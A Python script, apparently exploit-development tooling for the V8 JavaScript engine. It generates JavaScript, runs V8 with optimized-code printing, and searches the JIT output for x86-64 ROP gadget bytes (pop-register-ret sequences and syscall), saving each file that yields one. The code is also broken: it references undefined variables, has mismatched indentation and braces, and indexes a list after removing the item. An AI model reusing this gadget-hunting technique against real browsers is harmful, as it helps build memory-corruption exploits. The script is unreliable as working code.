import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
dd = [0, 0]
exec_path = ''

def excute_js(js:str)->bool:
    f = open('test.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code test.js > test.txt')
    f = open('test.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('lea') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    print(words)
                    gadgets.remove(jsc)
                    os.system('cp test.js ' + jsc + str(dd[gadgets.index(jsc)]) + '.js')
                    dd[gadgets.index(jsc)] += 1

def search_word(word:str, lines:list):
    result = ''
    for line in lines:
        if line.find(word) != -1:
            result += line
    return result

def analyse(count:int):
    f = open('test.txt', 'r')
    lines = f.readlines()
    f.close()
    result = ''
    for i in range(111, 114 + count):
        result += search_word(',0x'+str(i), lines)
    return result

def generate_js(count:int):
    header = '''
var array1 = new Uint8Array();
var array2 = new Uint8Array();
function payload3(v1, v2) {
    var array1 = new Uint8Array();
'''
    middle = '''

'''
    tail = '''
    return g1 ^ g2 ^ g10 ^ g11 ^ g12 ^ g13 ^ g14 ^ g15 ^ g16 ^ g17 ^ g18 ^ g19 ^ g20 ^ g21;
}


for (var i = 0; i < 0x10000; i++) {
        payload3(i, i % 32);
}}
'''
        excute_js(header + middle1 + jsc + middle2 + tail)
    # return header + middle1 + jsc + middle2 + tail


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()


    for i in range(24):
        generate_js(i)
    print('done')